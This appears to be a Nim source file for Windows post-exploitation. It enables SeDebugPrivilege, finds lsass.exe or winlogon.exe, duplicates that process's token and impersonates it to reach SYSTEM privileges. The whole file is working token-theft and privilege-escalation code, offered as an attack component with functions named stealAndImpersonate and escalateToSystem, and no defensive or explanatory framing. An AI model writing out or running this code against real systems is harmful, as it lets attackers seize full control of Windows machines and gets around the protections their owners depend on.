# token.nim — token impersonation + SeDebugPrivilege escalation

import winim

proc enableDebugPrivilege*(): bool =
  # unsafe
  var token: HANDLE = nil
  if OpenProcessToken(GetCurrentProcess(),
                      TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
                      addr token) == 0:
    return false

  var nameBuf: array[20, WCHAR]
  let privName = "SeDebugPrivilege"
  for i, c in privName:
    nameBuf[i] = WCHAR(c)
  nameBuf[privName.len] = WCHAR(0)

  var luid: LUID
  if LookupPrivilegeValueW(nil, cast[LPCWSTR](addr nameBuf[0]), addr luid) == 0:
    discard CloseHandle(token)
    return false

  var tp: TOKEN_PRIVILEGES
  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
  let ok = AdjustTokenPrivileges(
    token, FALSE, addr tp,
    DWORD(sizeof(TOKEN_PRIVILEGES)),
    nil, nil) != 0
  discard CloseHandle(token)
  ok

proc findPid*(targetName: string): uint32 =
  # unsafe — returns 0 on not found
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return 0

  var entry: PROCESSENTRY32W
  zeroMem(addr entry, sizeof(entry))
  entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))

  if Process32FirstW(snap, addr entry) == 0:
    discard CloseHandle(snap)
    return 0

  while true:
    var nameEnd = 0
    while nameEnd < 260 and entry.szExeFile[nameEnd] != 0:
      inc nameEnd
    var name = newString(nameEnd)
    for i in 0 ..< nameEnd:
      name[i] = char(entry.szExeFile[i])

    if name.toLowerAscii() == targetName.toLowerAscii():
      let pid = entry.th32ProcessID
      discard CloseHandle(snap)
      return pid

    if Process32NextW(snap, addr entry) == 0: break

  discard CloseHandle(snap)
  0

proc stealAndImpersonate*(pid: uint32): bool =
  # unsafe
  let pr = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid)
  if pr == nil: return false

  var srcToken: HANDLE = nil
  if OpenProcessToken(pr, TOKEN_DUPLICATE or TOKEN_QUERY, addr srcToken) == 0:
    discard CloseHandle(pr)
    return false

  var dupToken: HANDLE = nil
  let ok = DuplicateTokenEx(
    srcToken, TOKEN_ALL_ACCESS, nil,
    SecurityImpersonation, TokenImpersonation,
    addr dupToken) != 0
  discard CloseHandle(srcToken)
  discard CloseHandle(pr)
  if not ok: return false

  let imp = SetThreadToken(nil, dupToken) != 0
  discard CloseHandle(dupToken)
  imp

proc escalateToSystem*(): bool =
  if not enableDebugPrivilege(): return false
  var pid = findPid("lsass.exe")
  if pid == 0: pid = findPid("winlogon.exe")
  if pid == 0: return false
  stealAndImpersonate(pid)

proc revert*() =
  discard SetThreadToken(nil, nil)
